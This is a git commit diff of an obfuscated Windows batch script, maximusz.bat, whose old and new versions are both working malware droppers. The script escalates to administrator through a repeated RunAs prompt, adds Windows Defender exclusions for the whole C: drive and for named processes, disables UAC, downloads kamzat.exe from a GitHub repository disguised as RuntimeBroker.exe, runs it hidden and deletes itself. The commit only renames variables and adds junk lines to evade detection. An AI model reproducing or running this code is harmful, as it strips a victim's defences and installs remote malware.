ba9e7e6df0ef5941cf9d192318ddc59a7112889f
boycots563 <glowfitaura.orders@gmail.com>
2025-09-12 06:53:41 +0200

    Update maximusz.bat

--- maximusz.bat
+++ maximusz.bat
@@ -1,39 +1,45 @@
 @echo off & setlocal enableDelayedExpansion
-set "fAIa=>nul" & set "tsRIc=SESSION" & set "zvB=NET" & set "PkYjM=2>&1"
-%zvB% %tsRIc% %fAIa% %PkYjM%
+set "YCqK=NET" & set "vWOQ=2>&1" & set "YyOyha=>nul" & set "PkuRUW=SESSION"
+set "BvUbgqi=exit" & set "iZkg=goto" & set "ythPnoy=start" & set "ZeEJXH=del" & set "KmzoUMPH=echo"
+rem AYTN liwH XjRYFLVOyV RKgzdvh & set "fxU=EjYxEN5BRN" & set "fGUA=CMXySxfy4O" & set "yBy=MqSO" & set "JkdPdi=x5y" & set "gNcqRQE=DTmffXMc" & set "GmirppZM=mdUZqXsMJ" & set "kgjwbDhU=pny6fWRJi" & if !yBy! equ !JkdPdi! (echo dummy) else (echo dummy)
+
+%YCqK% %PkuRUW% %YyOyha% %vWOQ%
 set "e=!errorlevel!" & set "a=:A" & set "b=:B"
-if !e! equ 0 (goto %a%) else (goto %b%)
+if !e! equ 0 (iZkg %a%) else (iZkg %b%)
 
 :A
-set "WUlzG=foo" & set "OWH=qux" & set "YYP=bar" & set "hKokE=baz" & rem hRH zKEYN SDTUh
-set "QbJ=powershell -ExecutionPolicy Bypass -Command"
-set "DYRM=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
-set "sJuao='C:\' -ErrorAction SilentlyContinue"
-!QbJ! "!DYRM! !sJuao!" %fAIa% %PkYjM%
-set "frks=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
-!QbJ! "!frks!" %fAIa% %PkYjM%
-set "bjH=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
-!QbJ! "!bjH!" %fAIa% %PkYjM%
-set "NWPv=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
-set "hnys=-Name 'EnableLUA' -Value 0"
-!QbJ! "!NWPv! !hnys!" %fAIa% %PkYjM%
-set "QhxrY=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
-!QbJ! "!QhxrY!" %fAIa% %PkYjM%
-if !errorlevel! neq 0 (goto %a%)
-set "llnE=timeout /t" & !llnE! 2 %fAIa% %PkYjM%
-set "DJMxx=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
-set "YZCQO=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
-!QbJ! "!DJMxx! !YZCQO!" %fAIa% %PkYjM%
+rem OmIic ANrCuGVKpz & set "STJHrEwN=RVBLe" & set "KIq=Pu3kPdl" & set "wxnt=eqF3zVjV" & set "hZvACLq=t8hSr52tud" & set "zriLIZ=0hLYNnhzq" & if !KIq! equ !wxnt! (echo dummy) else (echo dummy)
+set "GqMN=powershell -ExecutionPolicy Bypass -Command"
+set "wSXmd=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
+set "eeh='C:\' -ErrorAction SilentlyContinue"
+!GqMN! "!wSXmd! !eeh!" %YyOyha% %vWOQ%
+set "AbhtWl=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
+!GqMN! "!AbhtWl!" %YyOyha% %vWOQ%
+set "HaTvK=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
+!GqMN! "!HaTvK!" %YyOyha% %vWOQ%
+set "iAT=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
+set "HkODkiY=-Name 'EnableLUA' -Value 0"
+!GqMN! "!iAT! !HkODkiY!" %YyOyha% %vWOQ%
+set "exxcRj=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
+!GqMN! "!exxcRj!" %YyOyha% %vWOQ%
+if !errorlevel! neq 0 (iZkg %a%)
+set "zaqUPVG=timeout /t" & !zaqUPVG! 2 %YyOyha% %vWOQ%
+set "pMNAvoo=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
+set "grGf=Invoke-WebRequest -Uri "https://github.com/boycots563/wlt56/raw/main/kamzat.exe" -OutFile "%TEMP%\RuntimeBroker.exe" -UseBasicParsing"
+!GqMN! "!pMNAvoo! !grGf!" %YyOyha% %vWOQ%
 
 :W
-if not exist "%TEMP%\RuntimeBroker.exe" (!llnE! 1 %fAIa% %PkYjM% & goto :W)
-start "" /B "%TEMP%\RuntimeBroker.exe" %fAIa% %PkYjM%
-del /f /q "%~f0" %fAIa% %PkYjM%
-exit /b
+if not exist "%TEMP%\RuntimeBroker.exe" (!zaqUPVG! 1 %YyOyha% %vWOQ% & iZkg :W)
+ythPnoy "" /B "%TEMP%\RuntimeBroker.exe" %YyOyha% %vWOQ%
+ZeEJXH /f /q "%~f0" %YyOyha% %vWOQ%
+BvUbgqi /b
 
 :B
+rem OIFLC LYxHs mtLvi & rem bjgDWvwLs JBkSS & set "FvQwAy=eBA" & set "wGRL=9JyxfXCIpu" & set "vzAJQiNa=KZ0dg" & set "WUbdtCS=ziVrzZ" & set "hXzKJCsU=H8D8UwBlS" & set "Qhqbp=ElAct" & if !hXzKJCsU! equ !vzAJQiNa! (echo dummy) else (echo dummy)
 set "h=powershell -WindowStyle Hidden -Command"
 set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
-!h! "!j1!" %fAIa% %PkYjM%
-if !errorlevel! neq 0 (!llnE! 3 %fAIa% %PkYjM% & goto %b%)
-exit /b
+!h! "!j1!" %YyOyha% %vWOQ%
+if !errorlevel! neq 0 (!zaqUPVG! 3 %YyOyha% %vWOQ% & iZkg %b%)
+BvUbgqi /b
+
+rem URFQBI klr rKkwH AEJOzSRj vEiGdIr
